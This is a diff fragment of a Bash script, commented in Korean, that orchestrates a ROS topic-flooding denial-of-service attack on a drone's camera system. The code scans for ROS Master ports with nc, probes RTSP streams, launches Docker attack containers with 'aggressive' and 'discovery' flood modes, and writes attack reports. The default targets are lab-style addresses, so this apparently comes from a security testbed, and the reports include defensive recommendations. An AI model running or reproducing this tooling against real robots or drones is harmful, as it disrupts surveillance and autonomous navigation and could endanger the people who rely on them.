-        "rtsp://127.0.0.1:8554/webcam"
-    )
-    
-    local stream_status=()
-    
-    for url in "${rtsp_urls[@]}"; do
-        echo -e "${CYAN}Testing RTSP stream: $url${NC}"
-        
-        # ffprobe를 사용한 스트림 테스트 (설치되어 있다면)
-        if command -v ffprobe >/dev/null 2>&1; then
-            if timeout 10 ffprobe -v quiet -select_streams v:0 -show_entries stream=width,height,r_frame_rate "$url" >/dev/null 2>&1; then
-                echo "  └─ ${GREEN}Stream accessible${NC}"
-                stream_status+=("$url:ACCESSIBLE")
-            else
-                echo "  └─ ${RED}Stream inaccessible${NC}"
-                stream_status+=("$url:INACCESSIBLE")
-            fi
-        else
-            # 네트워크 연결만 테스트
-            local rtsp_host=$(echo "$url" | sed 's/rtsp:\/\/\([^:]*\).*/\1/')
-            local rtsp_port=$(echo "$url" | sed 's/rtsp:\/\/[^:]*:\([0-9]*\).*/\1/')
-            
-            if timeout 5 bash -c "</dev/tcp/$rtsp_host/$rtsp_port" 2>/dev/null; then
-                echo "  └─ ${GREEN}RTSP port accessible${NC}"
-                stream_status+=("$url:PORT_ACCESSIBLE")
-            else
-                echo "  └─ ${RED}RTSP port inaccessible${NC}"
-                stream_status+=("$url:PORT_INACCESSIBLE")
-            fi
-        fi
-    done
-    
-    echo -e "${GREEN}=== RTSP Stream Status ===${NC}"
-    for status in "${stream_status[@]}"; do
-        local url=$(echo "$status" | cut -d: -f1)
-        local state=$(echo "$status" | cut -d: -f2)
-        echo "  └─ $url: $state"
-    done
-}
-
-generate_ros_flood_report() {
-    local ros_master="$1"
-    local attack_summary="$2"
-    local container_id="$3"
-    
-    log_info "Generating ROS flood attack report..."
-    
-    local successful=$(echo "$attack_summary" | cut -d: -f1)
-    local total=$(echo "$attack_summary" | cut -d: -f2)
-    local success_rate=$((successful * 100 / total))
-    
-    local report_file="$(get_log_dir)/camera_ros_flood_report_$(date +%Y%m%d_%H%M%S).txt"
-    
-    cat > "$report_file" << EOF
-╔═══════════════════════════════════════════════════╗
-║          카메라 ROS 토픽 플러딩 공격 보고서       ║
-╚═══════════════════════════════════════════════════╝
-
-Date: $(date)
-Attack Type: ROS Topic Flooding
-Target ROS Master: $ros_master
-Container ID: $container_id
-Success Rate: ${success_rate}% (${successful}/${total})
-
-╔═══ ATTACK SUMMARY ═══╗
-
-Target System: ROS-enabled Drone Camera
-Attack Vector: Topic Message Flooding
-Protocol: ROS (Robot Operating System)
-Topics Targeted:
-  - /webcam/image_raw
-  - /camera/image_raw
-  - /camera/image_compressed
-  - /usb_cam/image_raw
-
-╔═══ ATTACK EXECUTION ═══╗
-
-$(cat "$LOG_FILE" | grep -A 25 "Escalating ROS Flood Attack" | tail -25)
-
-╔═══ RTSP IMPACT ASSESSMENT ═══╗
-
-$(cat "$LOG_FILE" | grep -A 10 "RTSP Stream Status" | tail -10)
-
-╔═══ SECURITY IMPLICATIONS ═══╗
-
-1. Resource Exhaustion
-   - Network bandwidth saturation
-   - CPU/Memory consumption
-   - ROS Master overload
-
-2. Service Disruption
-   - RTSP stream interruption
-   - Camera feed degradation
-   - Real-time processing delays
-
-3. System Stability
-   - ROS node crashes
-   - Topic subscriber failures
-   - Message queue overflow
-
-╔═══ ATTACK MECHANISMS ═══╗
-
-1. Message Flooding
-   - High-frequency message publishing
-   - Large payload injection
-   - Multiple topic targeting
-
-2. Resource Competition
-   - Bandwidth exhaustion
-   - Processing queue saturation
-   - Memory allocation stress
-
-3. Service Degradation
-   - Legitimate message delays
-   - Topic subscription failures
-   - Stream quality reduction
-
-╔═══ EXPLOITATION SCENARIOS ═══╗
-
-1. Surveillance Disruption
-   - Camera feed interruption
-   - Real-time monitoring failure
-   - Video recording corruption
-
-2. Navigation Interference
-   - Visual SLAM disruption
-   - Object detection failure
-   - Autonomous flight degradation
-
-3. Communication Overload
-   - ROS Master saturation
-   - Topic publication delays
-   - System responsiveness loss
-
-╔═══ DEFENSIVE RECOMMENDATIONS ═══╗
-
-1. 네트워크 보안
-   - ROS 네트워크 격리
-   - 방화벽 규칙 구현
-   - 트래픽 속도 제한
-
-2. 시스템 모니터링
-   - 토픽 메시지 속도 감시
-   - 비정상 퍼블리셔 탐지
-   - 리소스 사용량 알림
-
-3. 아키텍처 강화
-   - 메시지 큐 크기 제한
-   - 퍼블리셔 인증 구현
-   - 백업 통신 채널
-
-╚═══════════════════════╝
-EOF
-
-    log_success "Report saved to: $report_file"
-    echo -e "${GREEN}Report location: $report_file${NC}"
-}
-
-cleanup() {
-    log_info "Cleaning up ROS attack environment..."
-    
-    # 공격 컨테이너 정리
-    if [[ -n "$ATTACK_CONTAINER_ID" ]]; then
-        echo -e "${YELLOW}[*] Removing attack container...${NC}"
-        docker rm -f "$ATTACK_CONTAINER_ID" >/dev/null 2>&1
-    fi
-    
-    # 임시 파일 정리
-    rm -f /tmp/ros_topic_flood.py 2>/dev/null
-}
-
-main() {
-    print_banner
-    check_prerequisites
-    
-    log_info "Starting camera ROS topic flooding attack..."
-    echo "Attack: $ATTACK_NAME" >> "$LOG_FILE"
-    echo "Timestamp: $(date)" >> "$LOG_FILE"
-    echo "================================" >> "$LOG_FILE"
-    
-    # ROS 환경 탐지
-    local ros_info=$(detect_ros_environment)
-    local network_mode=$(echo "$ros_info" | cut -d: -f1)
-    local ros_masters=($(echo "$ros_info" | cut -d: -f2-))
-    
-    # 활성 ROS Master 찾기
-    local active_ros_master=""
-    for ros_master in "${ros_masters[@]}"; do
-        if test_ros_connectivity "$ros_master"; then
-            active_ros_master="$ros_master"
+            echo -e "${RED}[!] Attack container stopped unexpectedly${NC}"
             break
         fi
+        
+        # 컨테이너 로그 샘플 출력
+        local recent_logs=$(docker logs --tail 5 "$container_name" 2>/dev/null | tail -2)
+        if [ -n "$recent_logs" ]; then
+            echo -e "${CYAN}    Recent activity: $recent_logs${NC}"
+        fi
     done
     
-    if [[ -z "$active_ros_master" ]]; then
-        log_error "No active ROS Master found"
-        exit 1
-    fi
+    echo -e "${YELLOW}[*] Attack duration completed${NC}"
     
-    echo -e "\n${BLUE}[*] Active ROS Master: $active_ros_master${NC}"
-    
-    # 공격 컨테이너 설정
-    local ros_master_ip=$(echo "$active_ros_master" | cut -d: -f1)
-    local container_ip="10.13.0.10"
-    
-    if [[ "$network_mode" == "wifi" ]]; then
-        container_ip="192.168.13.10"
-    fi
-    
-    echo -e "\n${BLUE}[*] Setting up attack container...${NC}"
-    local container_id=$(setup_ros_attack_container "$ros_master_ip" "$container_ip")
-    
-    if [[ -z "$container_id" ]]; then
-        log_error "Failed to setup attack container"
-        exit 1
-    fi
-    
-    export ATTACK_CONTAINER_ID="$container_id"
-    
-    # ROS 토픽 확인
-    echo -e "\n${BLUE}[*] Checking available ROS topics...${NC}"
-    check_ros_topics "$container_id" | tee -a "$LOG_FILE"
-    
-    # 단계별 플러딩 공격
-    echo -e "\n${BLUE}[*] Executing escalating flood attack...${NC}"
-    local attack_summary=$(perform_escalating_flood_attack "$container_id")
-    
-    # RTSP 스트림 영향 모니터링
-    echo -e "\n${BLUE}[*] Monitoring RTSP stream impact...${NC}"
-    monitor_rtsp_stream_impact 30 | tee -a "$LOG_FILE"
-    
-    # 보고서 생성
-    generate_ros_flood_report "$active_ros_master" "$attack_summary" "$container_id"
-    
-    cleanup
-    
-    log_success "Camera ROS topic flooding attack completed"
-    echo "Attack completed at $(date)" >> "$LOG_FILE"
+    # 최종 로그 출력
+    echo -e "${CYAN}=== Final Attack Statistics ===${NC}"
+    docker logs --tail 10 "$container_name" 2>/dev/null | grep -E "(messages sent|Topics flooded|Average rate)" || echo "No statistics available"
 }
 
-# Signal handlers for graceful cleanup
-trap cleanup EXIT
-trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM
+# ROS Master 스캔
+scan_ros_masters() {
+    log_info "Scanning for ROS Master services..."
+    
+    local common_targets=(
+        "10.13.0.5:11311"
+        "192.168.13.5:11311"
+        "127.0.0.1:11311"
+        "10.13.0.3:11311"
+        "192.168.1.100:11311"
+    )
+    
+    local found_masters=()
+    
+    for target in "${common_targets[@]}"; do
+        local ip=$(echo "$target" | cut -d':' -f1)
+        local port=$(echo "$target" | cut -d':' -f2)
+        
+        if timeout 3 nc -z "$ip" "$port" 2>/dev/null; then
+            found_masters+=("$target")
+            echo -e "${GREEN}Found ROS Master: $target${NC}"
+        fi
+    done
+    
+    if [ ${#found_masters[@]} -eq 0 ]; then
+        echo -e "${YELLOW}No live ROS Masters found, using simulation mode${NC}"
+        return 1
+    fi
+    
+    return 0
+}
 
-# Execute main function
-main "$@"
+# 메인 실행 함수
+main() {
+    print_attack_banner
+    
+    if [ "$EUID" -ne 0 ]; then
+        log_error "This script must be run as root"
+        exit 1
+    fi
+    
+    # 필수 도구 확인
+    local required_tools=("python3" "docker")
+    local missing_tools=()
+    
+    for tool in "${required_tools[@]}"; do
+        if ! command -v "$tool" >/dev/null 2>&1; then
+            missing_tools+=("$tool")
+        fi
+    done
+    
+    if [ ${#missing_tools[@]} -gt 0 ]; then
+        log_error "Missing required tools: ${missing_tools[*]}"
+        exit 1
+    fi
+    
+    # Docker 서비스 확인
+    if ! docker ps >/dev/null 2>&1; then
+        log_error "Docker is not running or accessible"
+        echo "Start Docker with: sudo systemctl start docker"
+        exit 1
+    fi
+    
+    # ROS Docker 이미지 확인
+    if ! docker images | grep -q "ros:noetic"; then
+        log_info "Pulling ROS Noetic Docker image..."
+        docker pull ros:noetic-ros-base >/dev/null 2>&1
+    fi
+    
+    # 사용자 옵션 처리
+    local ros_master_host="${1:-10.13.0.5}"
+    local ros_master_port="${2:-11311}"
+    local flood_mode="${3:-camera_only}"
+    local duration="${4:-60}"
+    
+    # 사용법 출력
+    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
+        echo "Usage: $0 [ros_master_host] [ros_master_port] [flood_mode] [duration]"
+        echo "  ros_master_host : ROS Master IP address (default: 10.13.0.5)"
+        echo "  ros_master_port : ROS Master port (default: 11311)"
+        echo "  flood_mode      : Flooding strategy (default: camera_only)"
+        echo "  duration        : Attack duration in seconds (default: 60)"
+        echo ""
+        echo "Flood modes:"
+        echo "  camera_only     : Target only camera-related topics"
+        echo "  aggressive      : High-rate flooding of multiple topics"
+        echo "  discovery       : Flood all discovered camera topics"
+        echo "  monitor         : Monitor system impact without flooding"
+        echo ""
+        echo "Examples:"
+        echo "  $0                                    # Basic camera flooding"
+        echo "  $0 10.13.0.5 11311 aggressive 120   # Aggressive mode for 120s"
+        echo "  $0 192.168.13.5 11311 discovery 90  # Discovery mode for 90s"
+        echo "  $0 127.0.0.1 11311 monitor 30       # Monitor mode for 30s"
+        echo ""
+        echo "Target examples:"
+        echo "  10.13.0.5:11311     - Docker bridge network"
+        echo "  192.168.13.5:11311  - WiFi network"
+        echo "  127.0.0.1:11311     - Local ROS Master"
+        exit 0
+    fi
+    
+    # ROS Master 스캔 (정보용)
+    scan_ros_masters
+    
+    # 공격 실행
+    execute_ros_flood_attack "$ros_master_host" "$ros_master_port" "$flood_mode" "$duration"
+    exit $?
+}
+
+# 직접 실행 시 메인 함수 호출
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
+    main "$@"
+fi
